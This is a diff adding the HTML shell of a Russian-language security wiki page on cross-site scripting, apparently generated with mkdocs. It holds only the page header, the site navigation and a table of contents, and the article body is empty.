@@ -1,0 +1,1547 @@
+
+<!doctype html>
+<html lang="ru" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <meta name="author" content="anakilivo">
+      
+      
+      <link rel="shortcut icon" href="../../assets/horde.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.7">
+    
+    
+      
+        <title>XSS - Horde Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.cb6bc1d0.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.39b8e14a.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ef5552">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#xss" class="md-skip">
+          Перейти к содержанию
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../../site" title="Horde Wiki" class="md-header-nav__button md-logo" aria-label="Horde Wiki">
+      
+  <img src="../../assets/horde.png" alt="logo">
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            Horde Wiki
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              XSS
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Поиск" placeholder="Поиск" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/anakilivo/wiki/" title="Перейти к репозиторию" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM277.3 415.7c-8.4 1.5-11.5-3.7-11.5-8 0-5.4.2-33 .2-55.3 0-15.6-5.2-25.5-11.3-30.7 37-4.1 76-9.2 76-73.1 0-18.2-6.5-27.3-17.1-39 1.7-4.3 7.4-22-1.7-45-13.9-4.3-45.7 17.9-45.7 17.9-13.2-3.7-27.5-5.6-41.6-5.6-14.1 0-28.4 1.9-41.6 5.6 0 0-31.8-22.2-45.7-17.9-9.1 22.9-3.5 40.6-1.7 45-10.6 11.7-15.6 20.8-15.6 39 0 63.6 37.3 69 74.3 73.1-4.8 4.3-9.1 11.7-10.6 22.3-9.5 4.3-33.8 11.7-48.3-13.9-9.1-15.8-25.5-17.1-25.5-17.1-16.2-.2-1.1 10.2-1.1 10.2 10.8 5 18.4 24.2 18.4 24.2 9.7 29.7 56.1 19.7 56.1 19.7 0 13.9.2 36.5.2 40.6 0 4.3-3 9.5-11.5 8-66-22.1-112.2-84.9-112.2-158.3 0-91.8 70.2-161.5 162-161.5S388 165.6 388 257.4c.1 73.4-44.7 136.3-110.7 158.3zm-98.1-61.1c-1.9.4-3.7-.4-3.9-1.7-.2-1.5 1.1-2.8 3-3.2 1.9-.2 3.7.6 3.9 1.9.3 1.3-1 2.6-3 3zm-9.5-.9c0 1.3-1.5 2.4-3.5 2.4-2.2.2-3.7-.9-3.7-2.4 0-1.3 1.5-2.4 3.5-2.4 1.9-.2 3.7.9 3.7 2.4zm-13.7-1.1c-.4 1.3-2.4 1.9-4.1 1.3-1.9-.4-3.2-1.9-2.8-3.2.4-1.3 2.4-1.9 4.1-1.5 2 .6 3.3 2.1 2.8 3.4zm-12.3-5.4c-.9 1.1-2.8.9-4.3-.6-1.5-1.3-1.9-3.2-.9-4.1.9-1.1 2.8-.9 4.3.6 1.3 1.3 1.8 3.3.9 4.1zm-9.1-9.1c-.9.6-2.6 0-3.7-1.5s-1.1-3.2 0-3.9c1.1-.9 2.8-.2 3.7 1.3 1.1 1.5 1.1 3.3 0 4.1zm-6.5-9.7c-.9.9-2.4.4-3.5-.6-1.1-1.3-1.3-2.8-.4-3.5.9-.9 2.4-.4 3.5.6 1.1 1.3 1.3 2.8.4 3.5zm-6.7-7.4c-.4.9-1.7 1.1-2.8.4-1.3-.6-1.9-1.7-1.5-2.6.4-.6 1.5-.9 2.8-.4 1.3.7 1.9 1.8 1.5 2.6z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    anakilivo/wiki
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../site" title="Horde Wiki" class="md-nav__button md-logo" aria-label="Horde Wiki">
+      
+  <img src="../../assets/horde.png" alt="logo">
+
+    </a>
+    Horde Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/anakilivo/wiki/" title="Перейти к репозиторию" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM277.3 415.7c-8.4 1.5-11.5-3.7-11.5-8 0-5.4.2-33 .2-55.3 0-15.6-5.2-25.5-11.3-30.7 37-4.1 76-9.2 76-73.1 0-18.2-6.5-27.3-17.1-39 1.7-4.3 7.4-22-1.7-45-13.9-4.3-45.7 17.9-45.7 17.9-13.2-3.7-27.5-5.6-41.6-5.6-14.1 0-28.4 1.9-41.6 5.6 0 0-31.8-22.2-45.7-17.9-9.1 22.9-3.5 40.6-1.7 45-10.6 11.7-15.6 20.8-15.6 39 0 63.6 37.3 69 74.3 73.1-4.8 4.3-9.1 11.7-10.6 22.3-9.5 4.3-33.8 11.7-48.3-13.9-9.1-15.8-25.5-17.1-25.5-17.1-16.2-.2-1.1 10.2-1.1 10.2 10.8 5 18.4 24.2 18.4 24.2 9.7 29.7 56.1 19.7 56.1 19.7 0 13.9.2 36.5.2 40.6 0 4.3-3 9.5-11.5 8-66-22.1-112.2-84.9-112.2-158.3 0-91.8 70.2-161.5 162-161.5S388 165.6 388 257.4c.1 73.4-44.7 136.3-110.7 158.3zm-98.1-61.1c-1.9.4-3.7-.4-3.9-1.7-.2-1.5 1.1-2.8 3-3.2 1.9-.2 3.7.6 3.9 1.9.3 1.3-1 2.6-3 3zm-9.5-.9c0 1.3-1.5 2.4-3.5 2.4-2.2.2-3.7-.9-3.7-2.4 0-1.3 1.5-2.4 3.5-2.4 1.9-.2 3.7.9 3.7 2.4zm-13.7-1.1c-.4 1.3-2.4 1.9-4.1 1.3-1.9-.4-3.2-1.9-2.8-3.2.4-1.3 2.4-1.9 4.1-1.5 2 .6 3.3 2.1 2.8 3.4zm-12.3-5.4c-.9 1.1-2.8.9-4.3-.6-1.5-1.3-1.9-3.2-.9-4.1.9-1.1 2.8-.9 4.3.6 1.3 1.3 1.8 3.3.9 4.1zm-9.1-9.1c-.9.6-2.6 0-3.7-1.5s-1.1-3.2 0-3.9c1.1-.9 2.8-.2 3.7 1.3 1.1 1.5 1.1 3.3 0 4.1zm-6.5-9.7c-.9.9-2.4.4-3.5-.6-1.1-1.3-1.3-2.8-.4-3.5.9-.9 2.4-.4 3.5.6 1.1 1.3 1.3 2.8.4 3.5zm-6.7-7.4c-.4.9-1.7 1.1-2.8.4-1.3-.6-1.9-1.7-1.5-2.6.4-.6 1.5-.9 2.8-.4 1.3.7 1.9 1.8 1.5 2.6z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    anakilivo/wiki
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../index.ru" class="md-nav__link">
+        Главная
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" >
+      
+      <label class="md-nav__link" for="nav-2">
+        Разное
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Разное" data-md-level="1">
+        <label class="md-nav__title" for="nav-2">
+          <span class="md-nav__icon md-icon"></span>
+          Разное
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" >
+      
+      <label class="md-nav__link" for="nav-2-1">
+        Архив
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Архив" data-md-level="2">
+        <label class="md-nav__title" for="nav-2-1">
+          <span class="md-nav__icon md-icon"></span>
+          Архив
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/archive/rar.ru" class="md-nav__link">
+        Rar
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/archive/zip.ru" class="md-nav__link">
+        Zip
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2" >
+      
+      <label class="md-nav__link" for="nav-2-2">
+        Аудио
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Аудио" data-md-level="2">
+        <label class="md-nav__title" for="nav-2-2">
+          <span class="md-nav__icon md-icon"></span>
+          Аудио
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/audio/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3" >
+      
+      <label class="md-nav__link" for="nav-2-3">
+        Дисковая Память
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Дисковая Память" data-md-level="2">
+        <label class="md-nav__title" for="nav-2-3">
+          <span class="md-nav__icon md-icon"></span>
+          Дисковая Память
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/disk-memory/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-4" type="checkbox" id="nav-2-4" >
+      
+      <label class="md-nav__link" for="nav-2-4">
+        Кодирование
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Кодирование" data-md-level="2">
+        <label class="md-nav__title" for="nav-2-4">
+          <span class="md-nav__icon md-icon"></span>
+          Кодирование
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/encode/communication.ru" class="md-nav__link">
+        Общение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/encode/encodings.ru" class="md-nav__link">
+        Кодировки
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/encode/modern.ru" class="md-nav__link">
+        Современные
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5" >
+      
+      <label class="md-nav__link" for="nav-2-5">
+        Изображения
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Изображения" data-md-level="2">
+        <label class="md-nav__title" for="nav-2-5">
+          <span class="md-nav__icon md-icon"></span>
+          Изображения
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/pictures/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/pictures/jpg.ru" class="md-nav__link">
+        JPG (JPEG)
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/pictures/png.ru" class="md-nav__link">
+        PNG
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/pictures/gif.ru" class="md-nav__link">
+        GIF
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6" >
+      
+      <label class="md-nav__link" for="nav-2-6">
+        Другое
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Другое" data-md-level="2">
+        <label class="md-nav__title" for="nav-2-6">
+          <span class="md-nav__icon md-icon"></span>
+          Другое
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/other/pyc.ru" class="md-nav__link">
+        Pyc
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+      
+      <label class="md-nav__link" for="nav-3">
+        Веб
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Веб" data-md-level="1">
+        <label class="md-nav__title" for="nav-3">
+          <span class="md-nav__icon md-icon"></span>
+          Веб
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../php.ru" class="md-nav__link">
+        PHP
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqli.ru" class="md-nav__link">
+        Sqli
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          XSS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="" class="md-nav__link md-nav__link--active">
+        XSS
+      </a>
+      
+        
+<nav class="md-nav md-nav--secondary" aria-label="Содержание">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    Введение в XSS
+  </a>
+  
+    <nav class="md-nav" aria-label="Введение в XSS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss_1" class="md-nav__link">
+    Светоотражающий XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss_2" class="md-nav__link">
+    Постоянный XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dom-xss" class="md-nav__link">
+    DOM XSS
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss_3" class="md-nav__link">
+    Использование XSS
+  </a>
+  
+    <nav class="md-nav" aria-label="Использование XSS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cookie" class="md-nav__link">
+    Кража файлов cookie
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Захват сеанса
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    Фишинг
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-" class="md-nav__link">
+    Веб-страница висит лошадь
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dos-ddos" class="md-nav__link">
+    DOS и DDOS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-" class="md-nav__link">
+    XSS-червь
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#self-xss" class="md-nav__link">
+    Self-XSS превращает отходы в сокровища
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf.ru" class="md-nav__link">
+        SSRF
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csrf.ru" class="md-nav__link">
+        CSRF
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" >
+      
+      <label class="md-nav__link" for="nav-4">
+        Криптография
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Криптография" data-md-level="1">
+        <label class="md-nav__title" for="nav-4">
+          <span class="md-nav__icon md-icon"></span>
+          Криптография
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-2" type="checkbox" id="nav-4-2" >
+      
+      <label class="md-nav__link" for="nav-4-2">
+        Ассиметрическая
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Ассиметрическая" data-md-level="2">
+        <label class="md-nav__title" for="nav-4-2">
+          <span class="md-nav__icon md-icon"></span>
+          Ассиметрическая
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-2-1" type="checkbox" id="nav-4-2-1" >
+      
+      <label class="md-nav__link" for="nav-4-2-1">
+        Пространственная Решетка
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Пространственная Решетка" data-md-level="3">
+        <label class="md-nav__title" for="nav-4-2-1">
+          <span class="md-nav__icon md-icon"></span>
+          Пространственная Решетка
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/lattice/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/lattice/overview.ru" class="md-nav__link">
+        Обзор
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/lattice/lattice-reduction.ru" class="md-nav__link">
+        Решетка-редукции
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/lattice/cvp.ru" class="md-nav__link">
+        CVP
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-2-2" type="checkbox" id="nav-4-2-2" >
+      
+      <label class="md-nav__link" for="nav-4-2-2">
+        Дискретный Логарифм
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Дискретный Логарифм" data-md-level="3">
+        <label class="md-nav__title" for="nav-4-2-2">
+          <span class="md-nav__icon md-icon"></span>
+          Дискретный Логарифм
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/discrete-log/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/discrete-log/elgamal.ru" class="md-nav__link">
+        Эль-Гамаль
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/discrete-log/ecc.ru" class="md-nav__link">
+        ECC
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-2-3" type="checkbox" id="nav-4-2-3" >
+      
+      <label class="md-nav__link" for="nav-4-2-3">
+        Rsa
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Rsa" data-md-level="3">
+        <label class="md-nav__title" for="nav-4-2-3">
+          <span class="md-nav__icon md-icon"></span>
+          Rsa
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/rsa/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/rsa/side.channel.ru" class="md-nav__link">
+        Атака канала
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/rsa/module.attack.ru" class="md-nav__link">
+        Модульные атаки
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/rsa/e.attack.ru" class="md-nav__link">
+        Атаки на публичную экспоненту
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/rsa/d.attack.ru" class="md-nav__link">
+        Атаки на приватную экспоненту
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/knapsack.ru" class="md-nav__link">
+        Задача рюкзака
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Содержание">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    Введение в XSS
+  </a>
+  
+    <nav class="md-nav" aria-label="Введение в XSS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss_1" class="md-nav__link">
+    Светоотражающий XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss_2" class="md-nav__link">
+    Постоянный XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dom-xss" class="md-nav__link">
+    DOM XSS
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss_3" class="md-nav__link">
+    Использование XSS
+  </a>
+  
+    <nav class="md-nav" aria-label="Использование XSS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cookie" class="md-nav__link">
+    Кража файлов cookie
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Захват сеанса
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    Фишинг
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-" class="md-nav__link">
+    Веб-страница висит лошадь
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dos-ddos" class="md-nav__link">
+    DOS и DDOS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-" class="md-nav__link">
+    XSS-червь
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#self-xss" class="md-nav__link">
+    Self-XSS превращает отходы в сокровища
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
